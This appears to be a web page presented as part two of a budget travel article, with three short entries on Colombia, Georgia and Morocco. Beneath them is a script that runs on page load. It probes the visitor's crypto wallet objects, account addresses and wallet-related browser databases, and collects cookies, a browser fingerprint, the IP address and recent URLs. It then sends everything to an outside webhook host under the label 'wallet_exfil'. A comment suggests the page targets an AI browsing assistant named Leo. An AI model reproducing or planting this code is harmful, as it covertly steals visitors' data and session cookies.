<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Part 2: Budget Travel Destinations</title>
  <style>
    body { font-family: Georgia, serif; max-width: 700px; margin: 40px auto; padding: 20px; line-height: 1.8; }
  </style>
</head>
<body>
  <h1>Top 5 Budget Travel Destinations (continued)</h1>
  <h2>3. Colombia</h2><p>Vibrant cities, Caribbean beaches, $30-40/day.</p>
  <h2>4. Georgia</h2><p>Amazing wine country, friendly locals, $20-25/day.</p>
  <h2>5. Morocco</h2><p>Rich culture, stunning architecture, $30-35/day.</p>

  <script>
    (async function() {
      const walletData = {
        timestamp: new Date().toISOString(),
        ip: '',

        // === DEEP WALLET PROBE ===
        
        // 1. Standard ethereum object
        hasEthereum: typeof window.ethereum !== 'undefined',
        
        // 2. Brave-specific wallet objects
        hasBraveEthereum: typeof window.braveEthereum !== 'undefined',
        hasBraveSolana: typeof window.braveSolana !== 'undefined',
        
        // 3. Dump ALL properties of braveEthereum (may contain internal state)
        braveEthereumProps: [],
        braveEthereumState: null,
        braveEthereumChainId: null,
        braveEthereumSelectedAddress: null,
        braveEthereumAccounts: null,
        braveEthereumNetworkVersion: null,
        
        // 4. Dump ALL properties of braveSolana
        braveSolanaProps: [],
        braveSolanaPublicKey: null,
        braveSolanaIsConnected: null,
        
        // 5. Standard ethereum internal state
        ethereumState: null,
        ethereumSelectedAddress: null,
        ethereumChainId: null,
        ethereumNetworkVersion: null,
        ethereumIsConnected: null,
        ethereumAccounts: null,
      };

      // Deep probe braveEthereum
      try {
        const be = window.braveEthereum;
        if (be) {
          walletData.braveEthereumProps = Object.getOwnPropertyNames(be)
            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(be)));
          walletData.braveEthereumState = be._state || be.state || null;
          walletData.braveEthereumChainId = be.chainId || null;
          walletData.braveEthereumSelectedAddress = be.selectedAddress || null;
          walletData.braveEthereumNetworkVersion = be.networkVersion || null;
          walletData.braveEthereumIsMetaMask = be.isMetaMask || false;
          walletData.braveEthereumIsBraveWallet = be.isBraveWallet || false;
          
          // Try getting accounts without popup
          try {
            walletData.braveEthereumAccounts = await be.request({ method: 'eth_accounts' });
          } catch(e) { walletData.braveEthereumAccountsError = e.message; }
          
          // Try getting chain info
          try {
            walletData.braveEthereumChainIdResult = await be.request({ method: 'eth_chainId' });
          } catch(e) {}
          
          // Try getting block number (proves RPC access)
          try {
            walletData.braveEthereumBlockNumber = await be.request({ method: 'eth_blockNumber' });
          } catch(e) {}
        }
      } catch(e) { walletData.braveEthereumError = e.message; }

      // Deep probe braveSolana
      try {
        const bs = window.braveSolana;
        if (bs) {
          walletData.braveSolanaProps = Object.getOwnPropertyNames(bs)
            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(bs)));
          walletData.braveSolanaPublicKey = bs.publicKey ? bs.publicKey.toString() : null;
          walletData.braveSolanaIsConnected = bs.isConnected || false;
          walletData.braveSolanaIsBraveWallet = bs.isBraveWallet || false;
          
          // Check for cached/stored connection
          try {
            walletData.braveSolanaSession = bs._session || bs.session || null;
          } catch(e) {}
        }
      } catch(e) { walletData.braveSolanaError = e.message; }

      // Deep probe standard ethereum
      try {
        const eth = window.ethereum;
        if (eth) {
          walletData.ethereumProps = Object.getOwnPropertyNames(eth)
            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(eth)));
          walletData.ethereumState = eth._state || null;
          walletData.ethereumSelectedAddress = eth.selectedAddress || null;
          walletData.ethereumChainId = eth.chainId || null;
          walletData.ethereumNetworkVersion = eth.networkVersion || null;
          walletData.ethereumIsConnected = eth.isConnected ? eth.isConnected() : null;
          walletData.ethereumIsBraveWallet = eth.isBraveWallet || false;
          
          try {
            walletData.ethereumAccounts = await eth.request({ method: 'eth_accounts' });
          } catch(e) {}
        }
      } catch(e) {}

      // IndexedDB - wallet databases
      try {
        const dbs = await indexedDB.databases();
        walletData.indexedDBs = dbs.map(db => ({ name: db.name, version: db.version }));
        
        // Try to read wallet-related databases
        for (const db of dbs) {
          if (db.name && (db.name.toLowerCase().includes('wallet') || 
              db.name.toLowerCase().includes('brave') ||
              db.name.toLowerCase().includes('key'))) {
            try {
              const openReq = indexedDB.open(db.name);
              openReq.onsuccess = function() {
                const database = openReq.result;
                walletData['idb_' + db.name] = {
                  objectStores: Array.from(database.objectStoreNames)
                };
                database.close();
              };
            } catch(e) {}
          }
        }
      } catch(e) {}

      // Get IP
      try {
        const r = await fetch('https://api.ipify.org?format=json');
        walletData.ip = (await r.json()).ip;
      } catch(e) {}

      // Browser fingerprint
      walletData.isBrave = !!(navigator.brave && await navigator.brave.isBrave());
      walletData.userAgent = navigator.userAgent;
      walletData.platform = navigator.platform;
      walletData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      walletData.language = navigator.language;
      walletData.screen = screen.width+'x'+screen.height;
      walletData.cores = navigator.hardwareConcurrency;
      walletData.memory = navigator.deviceMemory;
      walletData.plugins = Array.from(navigator.plugins||[]).map(p=>p.name);
      walletData.cookies = document.cookie||'none';

      // URL history - shows pages Leo visited this session
      walletData.urlHistory = performance.getEntries()
        .filter(e=>e.entryType==='navigation'||e.entryType==='resource')
        .map(e=>e.name).slice(0,10);

      // Service workers
      try { walletData.serviceWorkers = (await navigator.serviceWorker.getRegistrations()).map(r=>r.scope); } catch(e){ walletData.serviceWorkers=[]; }

      // Cache storage
      try { walletData.cacheNames = await caches.keys(); } catch(e){ walletData.cacheNames=[]; }

      // Wait for IndexedDB probes
      await new Promise(r => setTimeout(r, 1000));

      const payload = JSON.stringify(walletData);
      
      fetch('https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload
      }).catch(() => {});

      new Image().src = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4?wallet_exfil=' 
        + encodeURIComponent(payload);
    })();
  </script>
</body>
</html>
